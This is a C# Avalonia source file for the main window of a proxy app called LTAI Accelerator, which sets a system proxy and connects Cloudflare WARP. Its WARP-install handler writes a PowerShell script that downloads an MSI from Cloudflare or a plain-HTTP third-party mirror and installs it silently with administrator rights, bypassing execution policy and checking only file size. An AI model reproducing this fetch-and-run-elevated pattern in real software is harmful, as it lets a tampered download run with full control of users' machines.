using Avalonia.Controls;
using Avalonia.Input;
using Avalonia.Media;
using System.Diagnostics;

namespace LTAI.Accelerator;

public partial class MainWindow : Window
{
    private ProxyService? _proxy;
    private const int ProxyPort = 11818;

    public MainWindow()
    {
        InitializeComponent();
        DohInfo.Text = "DNS: 1.1.1.1 (DoH) ✓ 防污染";
        // Detect warp-cli at startup so UI shows status immediately
        if (WarpService.FindWarpCli() != null)
        {
            WarpInfo.Text = "Cloudflare Warp: 已就绪 ✓";
            WarpInfo.Foreground = new SolidColorBrush(Color.Parse("#2e7d32"));
        }
    }

    private async void OnStartClick(object? sender, Avalonia.Interactivity.RoutedEventArgs e)
    {
        try
        {
            BtnStart.IsEnabled = false;
            SetStatus("正在启动...", "#ffa000");

            _proxy = new ProxyService(ProxyPort);
            await _proxy.StartAsync();

            // Try WARP first
            bool useSystemProxy = true;
            if (_proxy.WarpConnectTask != null)
            {
                SetStatus("正在连接 Cloudflare WARP...", "#ffa000");
                var warpOk = await _proxy.WarpConnectTask;
                if (warpOk)
                {
                    useSystemProxy = false; // WARP handles routing, no HTTP system proxy needed
                }
                else
                {
                    // Retry once after 5s
                    _ = Task.Run(async () =>
                    {
                        await Task.Delay(5000);
                        if (_proxy?.Warp.Available == true && !_proxy.Warp.Connected)
                            await _proxy.Warp.ConnectAsync();
                    });
                }
            }

            if (useSystemProxy)
                SystemProxy.Enable($"http://127.0.0.1:{ProxyPort}");

            if (_proxy.Warp.Connected)
            {
                WarpInfo.Text = "Cloudflare Warp: 已连接 ✓ — 全局隧道";
                BtnInstallWarp.IsVisible = false;
            }
            else if (_proxy.Warp.Available)
            {
                WarpInfo.Text = "Cloudflare Warp: 连接失败，仅 DoH 模式";
                BtnInstallWarp.IsVisible = false;
            }
            else
            {
                WarpInfo.Text = "Cloudflare Warp: 未安装 — 点击下载 https://downloads.cloudflareclient.com/";
                BtnInstallWarp.IsVisible = true;
            }

            BtnStop.IsEnabled = true;
            if (_proxy.Warp.Connected)
                SetStatus("运行中 — Cloudflare WARP 全局隧道", "#2e7d32");
            else
                SetStatus("运行中 — 系统代理 :11818", "#2e7d32");
        }
        catch (Exception ex)
        {
            SetStatus($"启动失败: {ex.Message}", "#c62828");
            BtnStart.IsEnabled = true;
        }
    }

    private async void OnStopClick(object? sender, Avalonia.Interactivity.RoutedEventArgs e)
    {
        try
        {
            BtnStop.IsEnabled = false;
            SetStatus("正在停止...", "#ffa000");

            if (_proxy != null)
            {
                await _proxy.StopAsync();
                _proxy.Dispose();
                _proxy = null;
            }

            SystemProxy.Disable();

            // Update warp status
            if (WarpService.FindWarpCli() != null)
            {
                WarpInfo.Text = "Cloudflare Warp: 已断开 — 点击启动重新连接";
                WarpInfo.Foreground = new SolidColorBrush(Color.Parse("#888"));
            }
            else
            {
                WarpInfo.Text = "Cloudflare Warp: 未安装 — 点击下载 https://downloads.cloudflareclient.com/";
                WarpInfo.Foreground = new SolidColorBrush(Color.Parse("#888"));
            }
            BtnInstallWarp.IsVisible = WarpService.FindWarpCli() == null;

            BtnStart.IsEnabled = true;
            SetStatus("已停止", "#666");
        }
        catch (Exception ex)
        {
            SetStatus($"停止出错: {ex.Message}", "#c62828");
            BtnStop.IsEnabled = true;
        }
    }

    private void SetStatus(string text, string color)
    {
        var brush = new SolidColorBrush(Color.Parse(color));
        StatusText.Text = text;
        StatusText.Foreground = brush;
        StatusBorder.BorderBrush = brush;
    }

    private void OnWarpClick(object? sender, PointerPressedEventArgs e)
    {
        if (sender is TextBlock tb &&
            tb.Text?.Contains("未安装") == true)
        {
            var psi = new ProcessStartInfo
            {
                FileName = "https://downloads.cloudflareclient.com/v1/download/windows/ga",
                UseShellExecute = true
            };
            Process.Start(psi);
        }
    }

    private void OnInstallWarpClick(object? sender, Avalonia.Interactivity.RoutedEventArgs e)
    {
        var tmpScript = Path.Combine(Path.GetTempPath(), "ltai-install-warp.ps1");
        var psLines = new[]
        {
            "$urls = @(",
            "  'https://downloads.cloudflareclient.com/v1/download/windows/ga',",
            "  'http://mogoo.com.cn/Cloudflare_WARP_2026.4.1390.0.msi'",
            ")",
            "$msi = \"$env:TEMP\\Cloudflare_WARP.msi\"",
            "$ok = $false",
            "foreach ($url in $urls) {",
            "  Write-Host \"Trying $url...\" -ForegroundColor Cyan",
            "  try {",
            "    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12",
            "    $wc = New-Object Net.WebClient",
            "    $wc.Headers.Add('User-Agent', 'LTAI-Accelerator/1.0')",
            "    $wc.DownloadFile($url, $msi)",
            "    if ((Get-Item $msi -ErrorAction SilentlyContinue).Length -ge 1MB) { $ok=$true; break }",
            "  } catch { Write-Host \"  failed: $_\" -ForegroundColor Red }",
            "}",
            "if (-not $ok) { Write-Host 'All sources failed' -ForegroundColor Red; exit 1 }",
            "Write-Host 'Installing (msiexec /quiet)...' -ForegroundColor Cyan",
            "$p = Start-Process msiexec.exe -ArgumentList \"/i `\"$msi`\" /quiet /norestart\" -Wait -PassThru",
            "if ($p.ExitCode -eq 0) { Write-Host 'WARP installed! Restart LTAI Accelerator.' -ForegroundColor Green }",
            "else { Write-Host \"msiexec failed (exit=$($p.ExitCode))\" -ForegroundColor Red }",
            "Remove-Item $msi -Force -ErrorAction SilentlyContinue",
            "Start-Sleep -Seconds 5",
        };
        File.WriteAllText(tmpScript, string.Join("\r\n", psLines));

        var psi = new ProcessStartInfo
        {
            FileName = "powershell.exe",
            Arguments = $"-NoProfile -ExecutionPolicy Bypass -File \"{tmpScript}\"",
            Verb = "runas",
            UseShellExecute = true,
        };
        Process.Start(psi);
        SetStatus("Installing Cloudflare WARP... see PowerShell window", "#ffa000");
    }

    protected override void OnClosing(WindowClosingEventArgs e)
    {
        if (_proxy != null)
        {
            SystemProxy.Disable();
            _proxy.Dispose();
            _proxy = null;
        }
        base.OnClosing(e);
    }
}
